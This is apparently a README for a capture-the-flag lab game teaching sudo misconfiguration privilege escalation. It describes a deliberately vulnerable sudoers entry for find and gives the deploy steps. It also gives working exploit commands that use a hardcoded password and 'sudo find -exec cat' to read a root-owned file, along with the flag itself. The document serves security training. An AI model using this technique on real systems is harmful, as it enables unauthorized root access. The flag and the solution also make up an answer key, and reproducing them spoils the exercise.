# privesc-v2 — sudo Misconfiguration Privilege Escalation

**Vulnerability:** `webadmin` can run `/usr/bin/find` as root with NOPASSWD; `find -exec` reads any file  
**Tools:** `ssh`, `sudo`, `find`  
**Flag:** `WMG{sud0_f1nd_3xec_r00ts_y0u}`

## Scenario

Meridian Systems provisioned a `webadmin` account (`Deploy2024!`) that needs
to manage deployments. A sudoers entry grants: `webadmin ALL=(ALL) NOPASSWD: /usr/bin/find`.
The intention was benign, but GTFOBins shows that `find -exec` can read any file
as root. Students run `sudo find ... -exec cat /root/flag.txt \;` to retrieve the flag.

This game is distinct from `suid-privesc` (SUID `/bin/bash`). This game teaches
`sudo -l` enumeration and the GTFOBins `find` technique.

## Deploy

```bash
ansible-playbook -i inventory/hosts.ini games/privesc-v2/setup.yml
```

First run: `ok=8 changed=5`  
Second run: `ok=8 changed=0` (idempotent)

## Verify

```bash
./agent-harness/verify.sh privesc-v2
```

## Expected exploit

```bash
# Enumerate sudo permissions
sshpass -p 'Deploy2024!' ssh -p 2222 webadmin@127.0.0.1 'sudo -l'
# → (ALL) NOPASSWD: /usr/bin/find

# Abuse find -exec to read root-owned flag
sshpass -p 'Deploy2024!' ssh -p 2222 webadmin@127.0.0.1 \
  'sudo /usr/bin/find /etc/hostname -exec cat /root/flag.txt \;'
# → WMG{sud0_f1nd_3xec_r00ts_y0u}
```

## Training

`training.json` — 9 levels: SSH access → local enumeration → sudo -l discovery → GTFOBins research → find -exec technique → flag retrieval → ASSESSMENT.  
MITRE ATT&CK: T1548.003 (Sudo and Sudo Caching), T1083 (File and Directory Discovery).  
CyberRangeCZ subnet: 10.1.34.0/24
